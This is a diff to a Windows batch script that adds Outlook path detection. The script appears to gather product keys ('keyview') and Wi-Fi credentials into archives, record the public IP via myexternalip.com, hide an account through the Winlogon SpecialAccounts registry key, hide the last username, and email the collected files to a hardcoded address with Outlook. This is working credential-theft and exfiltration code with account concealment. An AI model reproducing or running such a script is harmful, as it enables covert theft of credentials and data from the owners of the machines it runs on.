@@ -13,6 +13,12 @@ REM. -- Setup vars
 SET user="myuser"
 SET pass="mypass"
 SET mail="myemail@gmail.com"
+if exist "%ProgramFiles(x86)%" (
+    set outlook="C:\Program Files (x86)\Microsoft Office\Office14\OUTLOOK.EXE"
+    )
+else(
+    set outlook="C:\Program Files\Microsoft Office\Office14\OUTLOOK.EXE"
+    )
 
 REM. -- Public IP
 curl.exe "http://myexternalip.com/raw" >> %USERDOMAIN%_IP.txt
@@ -43,6 +49,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 REM. -- Hide last user logged in to machine
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
 
-C:\program files\microsoft office\office12\outlook.exe /c ipm.note /m %mail% /a keyview_%USERDOMAIN%.7z 
-C:\program files\microsoft office\office12\outlook.exe /c ipm.note /m %mail% /a wifi_%USERDOMAIN%.7z
-C:\program files\microsoft office\office12\outlook.exe /c ipm.note /m %mail% /a %USERDOMAIN%_IP.txt
+%outlook% /c ipm.note /m %mail% /a keyview_%USERDOMAIN%.7z 
+%outlook% /c ipm.note /m %mail% /a wifi_%USERDOMAIN%.7z
+%outlook% /c ipm.note /m %mail% /a %USERDOMAIN%_IP.txt
